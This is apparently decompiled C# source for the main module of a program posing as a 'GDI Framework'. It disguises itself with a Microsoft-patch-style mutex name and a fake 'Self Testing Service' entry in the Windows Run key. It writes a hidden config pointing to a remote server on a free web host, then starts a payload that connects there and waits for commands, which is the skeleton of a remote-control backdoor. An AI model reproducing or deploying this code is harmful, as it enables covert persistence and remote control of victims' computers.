namespace gdi_framework
{
    using gdi_framework.My.Resources;
    using Microsoft.VisualBasic.CompilerServices;
    using Microsoft.VisualBasic.Devices;
    using System;
    using System.IO;
    using System.Threading;
    using System.Windows.Forms;

    [StandardModule]
    internal sealed class MainModule
    {
        [STAThread]
        public static void Main()
        {
            bool flag;
            new Mutex(true, "GDI KB912741", out flag);
            if (!flag)
            {
                Environment.Exit(0);
            }
            NotifyIcon icon = new NotifyIcon {
                Icon = gdi_framework.My.Resources.Resources.icon,
                Text = "GDI Framework is starting...",
                Visible = true
            };
            Thread.Sleep(0xbb8);
            IniFile configuration = new IniFile();
            if (!File.Exists($"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}/SQLiConfig.dat"))
            {
                configuration.AddSection("user-access");
                configuration.SetKeyValue("user-access", "u", "root");
                configuration.SetKeyValue("user-access", "p", "user");
                configuration.AddSection("connection");
                configuration.SetKeyValue("connection", "server", "https://gdi-frameworklib.000webhostapp.com/");
                configuration.SetKeyValue("connection", "udid", "None");
                try
                {
                    configuration.Save($"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}/SQLiConfig.dat");
                }
                catch (Exception exception1)
                {
                    ProjectData.SetProjectError(exception1);
                    Exception exception = exception1;
                    ProjectData.ClearProjectError();
                }
            }
            else
            {
                configuration.Load($"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}/SQLiConfig.dat", false);
            }
            try
            {
                new Computer().Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true).SetValue("GDI Self Testing Service", Application.ExecutablePath);
            }
            catch (Exception exception3)
            {
                ProjectData.SetProjectError(exception3);
                Exception exception2 = exception3;
                ProjectData.ClearProjectError();
            }
            icon.Visible = false;
            icon.Dispose();
            Payload payload1 = new Payload(configuration.GetKeyValue("connection", "server"), configuration, configuration.GetKeyValue("user-access", "u"), configuration.GetKeyValue("user-access", "p"));
            payload1.Connect();
            payload1.ListenForCommands();
        }
    }
}

